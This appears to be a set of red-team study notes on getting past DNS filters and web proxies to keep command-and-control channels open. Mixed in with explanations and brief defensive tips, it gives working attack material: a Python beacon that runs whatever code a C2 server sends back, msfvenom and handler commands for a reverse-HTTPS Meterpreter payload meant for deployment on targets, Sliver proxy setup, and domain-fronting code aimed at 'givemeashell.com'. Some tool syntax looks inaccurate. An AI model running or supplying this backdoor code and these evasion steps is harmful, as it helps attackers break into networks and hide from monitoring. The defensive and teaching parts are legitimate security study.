
## 9.1 DNS Filters

DNS filtering is a common defensive mechanism employed by networks to block access to known malicious or undesirable domains. Let's break down how DNS filters work, and provide examples to illustrate the concepts.

### How DNS Filters Work

1. **DNS Lookup Process**:
   - When a client (e.g., a web browser) needs to access a website, it first performs a DNS lookup to translate the human-readable domain name (e.g., www.example.com) into an IP address that can be used to route the request.

2. **Traversing DNS Servers**:
   - This DNS request may pass through several DNS servers within the target network, each potentially performing some level of filtering or logging.

3. **DNS Filtering**:
   - At some point, the DNS request reaches a DNS filtering system, which checks the requested domain against a blocklist of known malicious or undesirable domains.
   - **Blocklists**: These are lists of domain names that have been flagged as harmful or inappropriate. An example of an open blocklist is [malwaredomainlist.com](http://malwaredomainlist.com).
   - **Heuristics**: More advanced DNS filtering systems might use heuristic analysis to detect suspicious domains based on patterns or behaviors indicative of malicious activity.

4. **Action Taken**:
   - **Blocked Request**: If the domain is found on the blocklist, the DNS filter can block the request. This can be done in several ways:
     - **Drop the Request**: The DNS server returns nothing, effectively blocking access to the domain without any feedback to the user.
     - **Sinkhole IP**: The DNS server returns a fake IP address (a sinkhole IP). This IP address could redirect the user to:
       - **Block Page**: A web page that informs the user that access to the domain has been blocked.
       - **Monitoring Device**: An IP address where traffic is captured and analyzed further.

### Examples

#### Example 1: Blocking a Malicious Domain

1. **Scenario**: A user attempts to access a known malicious website, www.malicious-site.com.
2. **DNS Lookup**: The user's computer sends a DNS lookup request to resolve www.malicious-site.com.
3. **DNS Filter**: The request reaches a DNS filter that checks the domain against a blocklist.
4. **Action**: 
   - The domain is on the blocklist.
   - The DNS filter returns a sinkhole IP, 192.0.2.1, instead of the real IP address.
   - The user’s browser is redirected to a block page hosted at 192.0.2.1, which displays a message: "Access to this site is blocked due to security reasons."

#### Example 2: Heuristic Blocking

1. **Scenario**: A user attempts to access a new phishing site, www.phishy-site.com, which is not yet on any blocklists but exhibits suspicious patterns.
2. **DNS Lookup**: The user's computer sends a DNS lookup request to resolve www.phishy-site.com.
3. **DNS Filter with Heuristics**: The DNS filter analyzes the domain and detects that it matches known patterns of phishing sites (e.g., recently registered domain, unusual traffic patterns).
4. **Action**:
   - The domain is flagged as suspicious based on heuristic analysis.
   - The DNS filter drops the request, and the user receives an error message in their browser: "This site can’t be reached."

### Security Considerations and Bypass Techniques

As penetration testers, understanding how DNS filters work helps in both defending and testing networks. Here are some considerations and potential bypass techniques:

1. **Using Unfiltered DNS Servers**:
   - **Custom DNS Servers**: Configure the client to use a DNS server that is not filtered by the target network. Public DNS servers like Google DNS (8.8.8.8) or Cloudflare DNS (1.1.1.1) might be used if they are not blocked by the network.
   - **Encrypted DNS**: Use DNS over HTTPS (DoH) or DNS over TLS (DoT) to bypass network filters. These protocols encrypt DNS queries, making it difficult for filters to inspect and block them.

2. **Domain Fronting**:
   - This technique involves disguising the true destination of a request by routing it through a trusted domain. This can sometimes bypass DNS filters if the trusted domain is not blocked.

3. **Tunneling Traffic**:
   - **VPNs and Proxies**: Use VPNs or proxies to tunnel all traffic, including DNS queries, through an encrypted connection, bypassing the DNS filter.
   - **SSH Tunneling**: Set up an SSH tunnel to forward DNS queries through a remote server.

### Conclusion

DNS filtering is an effective defense mechanism against malicious domains, but understanding its workings allows penetration testers to assess its efficacy and identify potential bypass methods. It's essential to always have proper authorization and follow ethical guidelines when performing such activities.

Exploiting a DNS sinkhole on a victim machine generally involves manipulating or spoofing DNS responses to redirect traffic for malicious purposes. Here’s how an attacker might exploit a DNS sinkhole:

### Methods of Exploiting DNS Sinkholes

1. **DNS Hijacking**:
   - **Description**: The attacker compromises the victim’s DNS settings, redirecting their DNS queries to a malicious DNS server controlled by the attacker.
   - **How it works**: 
     - **Compromise DNS Settings**: The attacker can modify the DNS settings on the victim’s machine directly or exploit vulnerabilities in routers to change DNS settings.
     - **Redirect Traffic**: The attacker’s DNS server returns IP addresses of malicious websites or servers instead of legitimate ones, redirecting the victim’s traffic.

2. **DNS Cache Poisoning**:
   - **Description**: The attacker injects malicious DNS entries into the cache of a DNS server, causing it to return incorrect IP addresses for domain names.
   - **How it works**:
     - **Send Malicious DNS Responses**: The attacker sends forged DNS responses to a DNS resolver. If successful, the resolver caches these incorrect entries.
     - **Redirect Traffic**: Users querying the poisoned resolver are directed to malicious sites.

3. **Man-in-the-Middle (MITM) Attacks**:
   - **Description**: The attacker intercepts DNS requests and responses, altering them to redirect traffic to malicious servers.
   - **How it works**:
     - **Intercept Traffic**: Using tools like ARP spoofing, the attacker positions themselves between the victim and the DNS server.
     - **Modify DNS Responses**: The attacker alters the responses to redirect traffic.

4. **Exploiting Vulnerable Sinkhole Implementations**:
   - **Description**: If a DNS sinkhole is not properly secured, an attacker might exploit vulnerabilities in its implementation to manipulate its behavior.
   - **How it works**:
     - **Exploit Vulnerabilities**: The attacker identifies and exploits vulnerabilities in the sinkhole server’s software or configuration.
     - **Manipulate Responses**: The attacker alters the sinkhole’s DNS responses to redirect traffic to malicious destinations.

### Example Scenarios

1. **Phishing Attack Using DNS Hijacking**:
   - **Objective**: Redirect users to a fake login page to steal credentials.
   - **Method**: 
     - The attacker changes the victim’s DNS settings to point to a malicious DNS server.
     - When the victim tries to visit a legitimate website (e.g., a bank), the DNS query is redirected to a fake website controlled by the attacker.

2. **Malware Distribution via DNS Cache Poisoning**:
   - **Objective**: Distribute malware by redirecting traffic from popular websites.
   - **Method**: 
     - The attacker poisons the cache of a public DNS resolver.
     - When users query the resolver for a popular website, they are redirected to a site hosting malware.

3. **Data Exfiltration via DNS Tunneling**:
   - **Objective**: Use DNS queries and responses to exfiltrate data from a victim’s network.
   - **Method**:
     - The attacker sets up a malicious DNS server that can decode data encoded in DNS queries.
     - The victim’s machine, infected with malware, encodes data into DNS queries and sends them to the attacker’s server.

### Preventive Measures

To protect against these types of attacks, several measures can be implemented:

1. **Secure DNS Configuration**:
   - Ensure DNS settings on devices and routers are locked down and cannot be easily changed by unauthorized users.

2. **Use Secure DNS Services**:
   - Utilize DNS services that support DNSSEC (DNS Security Extensions) to prevent tampering with DNS responses.

3. **Network Security Monitoring**:
   - Monitor network traffic for unusual patterns that might indicate DNS hijacking or MITM attacks.

4. **Regular Software Updates**:
   - Keep DNS servers and networking equipment up to date with the latest security patches.

5. **Education and Awareness**:
   - Educate users about phishing attacks and the importance of verifying URLs before entering sensitive information.

By implementing these measures, the risk of DNS-related attacks can be significantly reduced.

## 9.2 Web Proxies

- User-Agent Strings https://useragentstring.com/pages/useragentstring.php

Bypassing web proxies to penetrate a network and maintain communication with a command and control (C2) server can be a complex task. Here’s a comprehensive approach that an attacker might take to blend in with outbound traffic and avoid detection by proxy policies and blacklists.

### Steps to Bypass Web Proxies:

1. **Understand the Environment**:
   - **Network Traffic Analysis**: Monitor network traffic to understand the patterns and types of allowed outbound connections.
   - **Proxy Configuration**: Identify the type of proxy in use (e.g., forward proxy, transparent proxy) and its configuration (e.g., rules, whitelists/blacklists).

2. **Use Commonly Allowed Protocols**:
   - **HTTPS**: Most organizations allow HTTPS traffic. Encapsulating communication within HTTPS makes it look like regular web traffic.
   - **DNS Tunneling**: Use DNS requests to tunnel data. This method leverages the DNS protocol to encapsulate the payload.

3. **Blend with Legitimate Traffic**:
   - **User-Agent Spoofing**: Mimic the user-agent string of commonly used browsers or software within the organization.
     ```python
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
     }
     ```
   - **HTTP/HTTPS Requests**: Make HTTP/HTTPS requests look like legitimate traffic, such as web browsing or API requests used by legitimate applications.

4. **Utilize Legitimate Services**:
   - **Cloud Services**: Use cloud services (e.g., AWS, Azure, Google Cloud) as intermediaries. Traffic to these services is often trusted.
   - **CDNs**: Route traffic through Content Delivery Networks (CDNs) which are typically whitelisted.

5. **Establish C2 Communication**:
   - **Beaconing**: Use a beaconing mechanism that periodically checks in with the C2 server, using randomized intervals to avoid detection.
   - **HTTP(S) POST/GET Requests**: Encapsulate commands and data within standard HTTP(S) requests to avoid raising suspicion.
   - **Domain Fronting**: Leverage domain fronting to mask the true destination of the traffic. This technique takes advantage of CDN features to make traffic appear as if it’s going to a different domain.

6. **Avoid Detection**:
   - **Encryption**: Encrypt the payload to prevent deep packet inspection (DPI) from detecting malicious content.
   - **Payload Obfuscation**: Obfuscate the payload to avoid signature-based detection.

### Example of an HTTP Beacon in Python:

Here’s a simplified example of an HTTP beaconing script in Python that mimics legitimate traffic:

```python
import requests
import time
import random

# C2 server URL (example)
c2_url = "https://example.com/c2_endpoint"

# Headers to mimic legitimate traffic
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

def beacon():
    while True:
        try:
            # Example data to send
            data = {
                "beacon": "status_check",
                "system_info": "dummy_data"
            }
            
            response = requests.post(c2_url, headers=headers, data=data, verify=False)
            if response.status_code == 200:
                print("Beacon sent successfully.")
                # Handle response from C2 server
                handle_response(response.text)
            else:
                print(f"Error: {response.status_code}")
        except Exception as e:
            print(f"Exception: {e}")

        # Randomize sleep interval to avoid detection
        sleep_interval = random.randint(30, 300)  # 30 seconds to 5 minutes
        time.sleep(sleep_interval)

def handle_response(response_text):
    # Parse and execute commands from C2 server
    print(f"Received response: {response_text}")
    # Example: execute received command
    exec(response_text)

if __name__ == "__main__":
    beacon()
```

### Security Considerations:

1. **Monitoring and Detection**: Network administrators should monitor outbound traffic patterns and look for anomalies.
2. **Proxy Configuration**: Ensure proxies are configured to inspect HTTPS traffic using SSL/TLS interception.
3. **Threat Intelligence**: Use updated threat intelligence feeds to block known malicious domains and IP addresses.
4. **User-Agent Whitelisting**: Implement strict whitelisting of user-agent strings used within the organization.
5. **Behavioral Analysis**: Deploy advanced security solutions that use behavioral analysis to detect suspicious activities.

This approach outlines how an attacker might bypass web proxies to blend in with legitimate traffic and maintain communication with a C2 server. The focus is on mimicking legitimate traffic patterns and leveraging commonly allowed protocols to avoid detection.

Using Metasploit with an HTTP proxy allows you to route your Metasploit traffic through a proxy server. This can be useful for hiding your IP address, bypassing network restrictions, or testing proxy configurations. Here's how you can configure Metasploit to use an HTTP proxy:

### Steps to Configure Metasploit to Use an HTTP Proxy

1. **Set Up the Proxy Configuration**:
   - Determine the proxy server's IP address and port number.
   - If your proxy requires authentication, obtain the username and password.

2. **Configure Metasploit to Use the Proxy**:
   - You can configure Metasploit to use an HTTP proxy by setting environment variables or configuring it directly within Metasploit.

#### Using Environment Variables

You can set the environment variables `HTTP_PROXY` and `HTTPS_PROXY` before starting Metasploit. This method will work for most command-line tools that respect these environment variables.

```bash
export HTTP_PROXY=http://username:password@proxy_ip:proxy_port
export HTTPS_PROXY=http://username:password@proxy_ip:proxy_port
msfconsole
```

Replace `username`, `password`, `proxy_ip`, and `proxy_port` with your proxy details.

#### Configuring Within Metasploit

You can also configure the proxy directly within Metasploit using the `setg` command to set global variables.

1. **Start Metasploit**:
   ```bash
   msfconsole
   ```

2. **Set the Global Proxy Settings**:
   ```ruby
   setg Proxies http:http://username:password@proxy_ip:proxy_port
   ```

### Example: Using Metasploit with an HTTP Proxy

Here's an example configuration:

1. **Start Metasploit**:
   ```bash
   msfconsole
   ```

2. **Set Proxy Configuration**:
   ```ruby
   setg Proxies http:http://user:pass@192.168.1.100:8080
   ```

3. **Verify the Configuration**:
   ```ruby
   showg Proxies
   ```

### Proxy Configuration for Specific Modules

Some Metasploit modules allow setting proxy settings individually. You can configure these within the module options.

1. **Select a Module**:
   ```ruby
   use auxiliary/scanner/http/http_version
   ```

2. **Set Proxy for the Module**:
   ```ruby
   set Proxies http:http://user:pass@192.168.1.100:8080
   ```

3. **Run the Module**:
   ```ruby
   run
   ```

### ProxyChains (Alternative Method)

You can also use ProxyChains to route Metasploit traffic through a proxy. ProxyChains allows you to chain multiple proxies together.

1. **Install ProxyChains**:
   ```bash
   sudo apt-get install proxychains
   ```

2. **Configure ProxyChains**:
   Edit the configuration file `/etc/proxychains.conf` and add your proxy settings.

   ```plaintext
   [ProxyList]
   http 192.168.1.100 8080
   ```

3. **Run Metasploit with ProxyChains**:
   ```bash
   proxychains msfconsole
   ```

### Tips and Considerations

- **Testing Proxy Connectivity**: Before using Metasploit, test the proxy connectivity with tools like `curl` or `wget` to ensure it’s working correctly.
- **Proxy Authentication**: If your proxy requires authentication, ensure your credentials are correctly formatted in the URL.
- **Logging**: Some proxies log traffic. Be aware of this if you're conducting penetration tests or other sensitive operations.

By following these steps, you can configure Metasploit to use an HTTP proxy, allowing you to route your traffic through a proxy server effectively. This can help you bypass network restrictions, anonymize your activities, and test proxy configurations.


#### Sliver and HTTP Proxy

The Sliver C2 framework is an open-source Command and Control (C2) framework that provides similar capabilities to commercial C2 frameworks like Cobalt Strike. It is used for red team operations, penetration testing, and adversary emulation. Configuring Sliver to work with an HTTP proxy allows you to route your C2 traffic through a proxy server, which can be useful for evading detection, bypassing network restrictions, and blending in with normal network traffic.

### Steps to Configure Sliver C2 Framework to Use an HTTP Proxy

#### 1. Install Sliver

First, ensure you have Sliver installed on your system. You can download and install it from the official [Sliver GitHub repository](https://github.com/BishopFox/sliver).

#### 2. Configure Proxy Settings in Sliver

Sliver allows you to configure HTTP proxy settings directly. Here’s how you can do it:

1. **Start Sliver**:
   ```bash
   sliver-server
   ```

2. **Create a New Listener with Proxy Settings**:
   When creating a new listener, you can specify the proxy settings.

   ```bash
   use listener http
   set proxy http://username:password@proxy_ip:proxy_port
   start listener
   ```

   Replace `username`, `password`, `proxy_ip`, and `proxy_port` with your actual proxy details.

3. **Generate a Payload that Uses the Proxy**:
   Generate a payload that will use the configured HTTP proxy.

   ```bash
   generate --http --proxy http://username:password@proxy_ip:proxy_port
   ```

4. **Deploy the Payload**:
   Deploy the generated payload on the target system.

#### Example: Configuring and Using Sliver with an HTTP Proxy

1. **Start Sliver**:
   ```bash
   sliver-server
   ```

2. **Create a New HTTP Listener with Proxy**:
   ```bash
   sliver > use listener http
   sliver > set proxy http://user:pass@192.168.1.100:8080
   sliver > start listener
   ```

3. **Generate a Payload**:
   ```bash
   sliver > generate --http --proxy http://user:pass@192.168.1.100:8080
   ```

4. **Deploy and Run the Payload** on the target machine.

### Using Sliver with ProxyChains

If you prefer to use ProxyChains to route Sliver traffic through a proxy, follow these steps:

1. **Install ProxyChains**:
   ```bash
   sudo apt-get install proxychains
   ```

2. **Configure ProxyChains**:
   Edit the configuration file `/etc/proxychains.conf` and add your proxy settings.

   ```plaintext
   [ProxyList]
   http 192.168.1.100 8080
   ```

3. **Run Sliver with ProxyChains**:
   ```bash
   proxychains sliver-server
   ```

### Tips and Considerations

- **Testing Proxy Connectivity**: Before using Sliver, test the proxy connectivity with tools like `curl` or `wget` to ensure it’s working correctly.
- **Proxy Authentication**: If your proxy requires authentication, ensure your credentials are correctly formatted in the URL.
- **Traffic Analysis**: Be aware that some proxies log traffic, which might expose your activities during a red team engagement.
- **Bypassing Network Restrictions**: Using proxies can help bypass network restrictions and egress filtering, but make sure to use legitimate user-agent strings and other headers to blend in with normal traffic.

By following these steps, you can configure the Sliver C2 framework to use an HTTP proxy, allowing you to route your C2 traffic effectively through a proxy server. This setup can help you in bypassing network restrictions, evading detection, and blending in with legitimate network traffic during your red team operations or penetration tests.

## TLS Certificate Pinning

TLS (Transport Layer Security) Certificate Pinning is a security mechanism that helps to prevent man-in-the-middle (MITM) attacks by ensuring that the client only accepts a specific public key or certificate for a particular server. Implementing certificate pinning in Meterpreter can help ensure that your communication is secure and not intercepted by an unauthorized party.

### Using TLS Certificate Pinning in Meterpreter

To enable TLS certificate pinning in Meterpreter, you will need to configure your payload and listener to use a specific SSL certificate. Here’s a step-by-step guide on how to achieve this:

#### Step 1: Generate or Obtain an SSL Certificate

First, you need an SSL certificate. You can generate a self-signed certificate or use an existing one from a trusted CA.

**Generating a self-signed certificate using OpenSSL:**

```bash
openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout meterpreter.key -out meterpreter.crt
```

This command generates a `meterpreter.key` and `meterpreter.crt` file.

#### Step 2: Create a PEM File

Combine the key and certificate into a PEM file:

```bash
cat meterpreter.key meterpreter.crt > meterpreter.pem
```

#### Step 3: Configure the Metasploit Listener

Configure the Metasploit listener to use the generated certificate:

1. **Start Metasploit:**

   ```bash
   msfconsole
   ```

2. **Set up the multi/handler with the SSL options:**

   ```plaintext
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_https
   set LHOST your_vps_ip
   set LPORT 443
   set HandlerSSLCert /path/to/meterpreter.pem
   set StagerVerifySSLCert true
   set StagerHost your_vps_ip
   set ExitOnSession false
   exploit -j
   ```

Make sure to replace `/path/to/meterpreter.pem` with the actual path to your PEM file and `your_vps_ip` with your Metasploit server IP address.

#### Step 4: Generate the Meterpreter Payload

Generate the payload to use the pinned certificate:

```plaintext
msfvenom -p windows/meterpreter/reverse_https LHOST=your_vps_ip LPORT=443 HandlerSSLCert=/path/to/meterpreter.pem StagerVerifySSLCert=true -f exe -o /path/to/meterpreter_payload.exe
```

Make sure to replace `your_vps_ip`, `443`, `/path/to/meterpreter.pem`, and `/path/to/meterpreter_payload.exe` with your actual values.

#### Step 5: Deploy the Payload

Deploy the generated payload (`meterpreter_payload.exe`) on the target machine.

#### Step 6: Verify the Connection

When the payload is executed on the target machine, it should connect back to the Metasploit listener using the specified SSL certificate. The connection will only be established if the certificate matches, ensuring that the communication is secure.

### Tips and Considerations

- **Certificate Validity**: Ensure that your certificate is valid and not expired. Self-signed certificates might need to be re-generated periodically.
- **PEM File Permissions**: Secure your PEM file with appropriate file permissions to prevent unauthorized access.
- **Verify Connections**: Regularly verify that your connections are using the correct certificate and are secure.

By following these steps, you can implement TLS certificate pinning in Meterpreter, enhancing the security of your communication and reducing the risk of MITM attacks during your engagements.


TLS Server Name Indication (SNI) is an extension to the TLS protocol that allows the client to specify the hostname it is attempting to connect to at the start of the handshake process. This is particularly useful when multiple virtual servers are hosted on a single IP address, enabling the server to present the correct SSL/TLS certificate based on the requested hostname.

### How SNI Works

When a client connects to a server over TLS, it includes the desired hostname in the initial handshake request. This allows the server to select the appropriate certificate to present to the client. Here’s a simplified overview of the process:

1. **Client Hello**: The client sends a "Client Hello" message to the server, including the SNI extension with the hostname.
2. **Server Hello**: The server reads the SNI extension, selects the corresponding certificate, and sends a "Server Hello" message back to the client, including the chosen certificate.
3. **Certificate Exchange and Key Agreement**: The server sends its certificate to the client. The client verifies the certificate, and they proceed with the key agreement and encryption setup.
4. **Secure Communication**: Once the handshake is complete, the client and server communicate securely using the agreed-upon encryption.

### Using SNI in Practice

#### Configuring SNI in Web Servers

Here are examples of how to configure SNI on common web servers.

**Apache**

To configure SNI on an Apache web server, you need to define multiple `VirtualHost` entries with different certificates:

```apache
<VirtualHost *:443>
    ServerName www.example.com
    DocumentRoot /var/www/example
    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/example.com.crt
    SSLCertificateKeyFile /etc/ssl/private/example.com.key
</VirtualHost>

<VirtualHost *:443>
    ServerName www.example2.com
    DocumentRoot /var/www/example2
    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/example2.com.crt
    SSLCertificateKeyFile /etc/ssl/private/example2.com.key
</VirtualHost>
```

**Nginx**

To configure SNI in Nginx, define multiple `server` blocks with different certificates:

```nginx
server {
    listen 443 ssl;
    server_name www.example.com;
    ssl_certificate /etc/ssl/certs/example.com.crt;
    ssl_certificate_key /etc/ssl/private/example.com.key;
    root /var/www/example;
}

server {
    listen 443 ssl;
    server_name www.example2.com;
    ssl_certificate /etc/ssl/certs/example2.com.crt;
    ssl_certificate_key /etc/ssl/private/example2.com.key;
    root /var/www/example2;
}
```

### Bypassing Network Filters Using SNI

An attacker can potentially use SNI to bypass network filters. Here’s how:

1. **Evasion through Multiple Domains**: By using SNI, an attacker can direct traffic to different domains hosted on the same IP address, potentially bypassing filters that only block specific domains.
2. **Domain Fronting**: This technique involves using SNI to make the traffic appear as if it’s intended for an allowed domain, while actually routing to a different domain. This can help in bypassing content filters that rely on domain names.

### Example: Using SNI with cURL

You can use cURL to specify the SNI hostname during a request:

```bash
curl --resolve example.com:443:1.2.3.4 https://example.com
```

In this command, `--resolve` tells cURL to resolve `example.com` to `1.2.3.4` and connect to it while using `example.com` as the SNI hostname.

### Using SNI in Metasploit and Other Tools

For advanced usage, like in penetration testing with tools like Metasploit, you may need to configure the payloads or handlers to use SNI. This often involves specifying the target hostname in the payload options.

### Conclusion

SNI is a powerful feature of TLS that allows hosting multiple SSL/TLS certificates on a single IP address, which is essential for virtual hosting. It also has implications for security and penetration testing, providing opportunities to evade network filters and perform domain fronting. Proper understanding and configuration of SNI are crucial for both defensive and offensive security practices.

Sure, let's walk through how you can use SNI and domain fronting to bypass network filters and access `givemeashell.com` from inside the host network using a CDN.

### Setup Overview

1. **Workstation**: 10.5.5.5 (inside the host network).
2. **CDN Endpoint**: 192.168.5.1 (serving cached content).
3. **Legitimate Site**: `totallyfine.com` (served by `cdn314.notarealprovider.com`).
4. **Target Site**: `givemeashell.com` (served by `cdn112.notarealprovider.com`).

The goal is to access `givemeashell.com` from the workstation (10.5.5.5) while making the traffic appear as if it's going to `totallyfine.com`.

### Step-by-Step Process

#### 1. Understanding Domain Fronting

Domain fronting involves making the HTTP request appear as if it's going to a legitimate domain (`totallyfine.com`), but actually routing it to your target domain (`givemeashell.com`). This is done by manipulating the SNI and the HTTP Host header.

- **SNI**: Indicates the legitimate domain (e.g., `totallyfine.com`).
- **Host Header**: Specifies the actual target domain (e.g., `givemeashell.com`).

#### 2. Preparing the Request

You need to make a request that uses `totallyfine.com` in the SNI but routes the traffic to `givemeashell.com`.

**Using cURL**:

```bash
curl -H "Host: givemeashell.com" --resolve totallyfine.com:443:192.168.5.1 https://totallyfine.com
```
#### 3. Using a CDN

CDNs like Cloudflare or Akamai are used to cache and serve content. In this case, `cdn314.notarealprovider.com` and `cdn112.notarealprovider.com` are the CDN endpoints for `totallyfine.com` and `givemeashell.com`, respectively.

Since the CDN caches content for different domains, you can leverage the CDN infrastructure to perform domain fronting.

### Example Walkthrough

1. **Initiate the Request from the Workstation**:
   - The workstation (10.5.5.5) makes a request to `totallyfine.com` using SNI.
   - The actual request inside the HTTP header points to `givemeashell.com`.

2. **SNI and HTTP Host Header Manipulation**:
   - The request uses `totallyfine.com` in the SNI extension.
   - The HTTP Host header points to `givemeashell.com`.

3. **CDN Processing**:
   - The CDN endpoint (192.168.5.1) receives the request.
   - The SNI indicates `totallyfine.com`, so the CDN accepts the connection.
   - The HTTP Host header specifies `givemeashell.com`, so the CDN serves content from `givemeashell.com`.

### Code Example with Python (Optional)

You can also perform this with a Python script using the `requests` library. Here's a simplified example:

```python
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.poolmanager import PoolManager
import ssl

class SNIAdapter(HTTPAdapter):
    def __init__(self, server_name, *args, **kwargs):
        self.server_name = server_name
        super(SNIAdapter, self).__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        kwargs['ssl_context'] = self._create_ssl_context(self.server_name)
        return super(SNIAdapter, self).init_poolmanager(*args, **kwargs)

    def _create_ssl_context(self, server_name):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.sni_hostname = server_name
        return context

session = requests.Session()
session.mount('https://', SNIAdapter('totallyfine.com'))

response = session.get('https://totallyfine.com', headers={'Host': 'givemeashell.com'}, verify=False)
print(response.content)
```

### Conclusion

By using SNI and manipulating the HTTP Host header, you can bypass network filters and access restricted domains through a CDN. This technique leverages the CDN's ability to serve multiple domains from a single IP address, making it an effective method for evading network security mechanisms.

Be sure to understand and comply with legal and ethical guidelines when performing any penetration testing or network operations.